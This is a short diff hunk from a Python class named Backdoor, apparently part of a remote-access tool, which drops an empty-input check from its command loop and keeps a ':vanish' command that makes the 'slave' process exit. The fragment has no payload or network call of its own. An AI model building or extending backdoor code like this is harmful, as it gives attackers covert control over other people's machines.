@@ -77,9 +77,7 @@ class Backdoor(object):
             self.__msg('#>')
             data = self.__send_and_recv()
 
-            if data == '':
-                continue
-            elif data == ':vanish':
+            if data == ':vanish':
                 self.__msg('Slave Vanishing...')
                 self.__send()
                 os._exit(0)
